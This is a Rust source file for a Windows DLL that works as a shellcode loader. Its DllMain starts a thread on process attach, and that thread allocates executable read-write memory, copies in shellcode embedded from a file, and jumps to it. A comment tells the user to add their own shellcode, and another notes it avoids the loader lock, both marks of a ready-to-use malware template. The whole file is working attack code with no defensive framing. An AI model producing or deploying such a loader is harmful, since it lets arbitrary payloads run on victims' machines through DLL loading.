use std::ptr;
use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin"); // add your shellcode.bin file path

unsafe extern "system" fn shellcode_thread(_: LPVOID) -> u32 {
    let mem = VirtualAlloc(
        ptr::null_mut(),
        SHELLCODE.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if mem.is_null() {
        return 1;
    }
    ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), mem as *mut u8, SHELLCODE.len());

    let entry: extern "system" fn() = std::mem::transmute(mem);
    entry();
    0
}

#[no_mangle]
pub extern "system" fn DllMain(
    _hmodule: HINSTANCE,
    reason: DWORD,
    _reserved: LPVOID,
) -> BOOL {
    const DLL_PROCESS_ATTACH: DWORD = 1;

    if reason == DLL_PROCESS_ATTACH {
        unsafe {
            // Spawn thread & never run shellcode directly under loader lock
            let _ = CreateThread(
                ptr::null_mut(),
                0,
                Some(shellcode_thread),
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            );
        }
    }
    1
}
